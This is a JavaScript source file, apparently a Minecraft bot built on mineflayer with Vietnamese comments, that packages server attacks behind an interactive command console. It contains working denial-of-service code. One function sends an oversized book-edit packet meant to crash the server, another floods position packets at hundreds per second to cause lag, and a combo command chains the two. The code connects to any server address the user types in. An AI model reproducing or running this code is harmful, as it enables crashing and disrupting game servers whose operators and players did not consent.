// file: interactive_bot_v4_robust.js

const mineflayer = require('mineflayer');
const readline = require('readline');
const { Vec3 } = require('vec3');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// --- UTILITY ---
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

// --- ATTACK MODULES (Đã được bọc thép với try...catch) ---

async function testBookExploit(bot) {
    try {
        console.log('\x1b[31m%s\x1b[0m', '[ATTACK] Bắt đầu Book Exploit...');
        const book = bot.inventory.findInventoryItem('writable_book');
        if (!book) { throw new Error('Không tìm thấy "Book and Quill" trong túi đồ.'); }
        
        await bot.equip(book, 'hand');
        await sleep(250 + Math.random() * 100);

        const pages = Array(50).fill('{"text":"' + 'CRASH '.repeat(8000) + '"}');
        bot._client.write('edit_book', { hand: 0, pages: pages, title: 'The Final Chapter' });
        console.log('\x1b[31m%s\x1b[0m', '>>> Gói tin Book Exploit đã được gửi đi!');
    } catch (err) {
        console.error('\x1b[31m%s\x1b[0m', `[LỖI] Book Exploit thất bại: ${err.message}`);
    }
}

let lagInterval = null;
function testPositionFlood(bot, pps) {
    if (lagInterval) {
        clearInterval(lagInterval);
        lagInterval = null;
        console.log('\x1b[32m%s\x1b[0m', '[ATTACK] Đã dừng Position Flood.');
        return;
    }
    // Cung cấp giá trị mặc định nếu pps không hợp lệ
    const packetsPerSecond = (typeof pps === 'number' && pps > 0) ? pps : 500;
    console.log(`\x1b[31m%s\x1b[0m`, `[ATTACK] Bắt đầu Position Flood với ${packetsPerSecond} packets/giây. Gõ '!lag' lần nữa để dừng.`);
    
    lagInterval = setInterval(() => {
        try {
            bot.entity.position.x += (Math.random() - 0.5) * 0.001;
            bot._client.write('position', { ...bot.entity.position, onGround: bot.entity.onGround });
        } catch (e) {
            // Hiếm khi xảy ra, nhưng để đề phòng bot crash khi đang flood
            console.error('[LỖI Flood] Lỗi khi gửi gói tin vị trí:', e.message);
            clearInterval(lagInterval);
            lagInterval = null;
        }
    }, 1000 / packetsPerSecond);
}

async function testComboAttack(bot) {
    try {
        console.log('\x1b[35m%s\x1b[0m', '--- BẮT ĐẦU COMBO TẤN CÔNG ---');
        const book = bot.inventory.findInventoryItem('writable_book');
        if (!book) { throw new Error('Bot cần có "Book and Quill" để thực hiện combo.'); }

        console.log('[COMBO GĐ1] Kích hoạt Position Flood...');
        testPositionFlood(bot, 750, true); 

        const lagDuration = 3000 + Math.random() * 2000;
        console.log(`[COMBO GĐ1] Duy trì áp lực trong ${Math.round(lagDuration/1000)} giây...`);
        await sleep(lagDuration);

        console.log('[COMBO GĐ2] Tung đòn Book Exploit kết liễu!');
        await testBookExploit(bot);

        setTimeout(() => {
            if (lagInterval) {
                console.log('[COMBO] Nhiệm vụ hoàn thành. Dừng Position Flood.');
                testPositionFlood(bot, 0, true); 
            }
        }, 2000);
    } catch (err) {
        console.error('\x1b[31m%s\x1b[0m', `[LỖI] Combo thất bại: ${err.message}`);
        if(lagInterval) testPositionFlood(bot, 0, true); // Dừng flood nếu combo lỗi
    }
}

// --- COMMAND CENTER (Cập nhật logic lệnh !lag) ---
function setupCommandHandler(bot) {
  rl.on('line', (line) => {
    const args = line.trim().split(' ');
    const command = args[0].toLowerCase();

    switch(command) {
        case '!chat': bot.chat(args.slice(1).join(' ')); break;
        case '!l': bot.chat(args.slice(1).join(' ')); break;
        case '!book': testBookExploit(bot); break;
        case '!lag':
            const ppsArg = parseInt(args[1]);
            if (args[1] && (isNaN(ppsArg) || ppsArg <= 0)) {
                console.log("Sử dụng: !lag [số]. Vui lòng nhập một số dương cho packet/giây.");
            } else {
                testPositionFlood(bot, ppsArg); // ppsArg có thể là NaN hoặc undefined, hàm sẽ xử lý
            }
            break;
        case '!combo': testComboAttack(bot); break; 
        case '!help':
            console.log(`
--- Bot V4 Robust Help ---
!chat <msg>      : Gửi tin nhắn.
!l <cmd>         : Thực thi lệnh.
!book            : (Crash) Thực hiện Book Exploit (cần sách).
!lag [số]        : (Lag) Bật/tắt Position Flood. Mặc định 500 pps.
!combo           : (Lag + Crash) Thực hiện combo tấn công (cần sách).
!quit            : Thoát bot.
----------------------------`);
            break;
        case '!quit': bot.quit(); break;
        default: if(command) console.log("Lệnh không hợp lệ. Gõ '!help' để xem danh sách.");
    }
    rl.prompt();
  }).on('close', () => process.exit(0));
}

// --- MAIN FUNCTION ---
function startBot(config) {
    const bot = mineflayer.createBot({ ...config });

    bot.on('login', () => {
        console.log('\x1b[32m%s\x1b[0m', `>>> Bot V4 đã vào game! Gõ '!help' để xem các lệnh.`);
        rl.prompt();
        setupCommandHandler(bot);
    });
    
    // --- EVENT HANDLERS (Đã được làm cho "bất tử") ---
    bot.on('chat', (username, message) => { if (username === bot.username) return; readline.cursorTo(process.stdout, 0); console.log(`\r<${username}> ${message}`); rl.prompt(true); });

    bot.on('kicked', (reason, loggedIn) => {
        console.log('\n\x1b[31m%s\x1b[0m', '>>> BOT ĐÃ BỊ KICK! <<<');
        let reasonText = reason; // Mặc định là chuỗi thô
        try {
            // Mineflayer có thể đã parse sẵn, hoặc nó là chuỗi JSON
            reasonText = mineflayer.ChatMessage.fromNotch(reason).toString();
        } catch (e) {
            // Không sao, cứ dùng chuỗi thô. Không để bot crash vì lý do này.
        }
        console.log('\x1b[31m%s\x1b[0m', `Lý do: ${reasonText}`);
        process.exit(1);
    });

    bot.on('error', (err) => console.log('\n\x1b[31m%s\x1b[0m', `>>> Lỗi Bot: ${err.message}`));
    bot.on('end', (reason) => { console.log('\n\x1b[33m%s\x1b[0m', `>>> Mất kết nối: ${reason}`); process.exit(0); });
}

// --- INITIALIZATION ---
console.log('--- Bot V4 Robust Edition by You ---');
rl.question('Server (ip:port): ', (address) => {
    rl.question('Tên Bot: ', (username) => {
        rl.question('Phiên bản (trống để auto): ', (version) => {
            const [host, portStr] = address.split(':');
            startBot({ host, port: parseInt(portStr) || 25565, username: username || 'RobustBot', version: version || false });
        });
    });
});
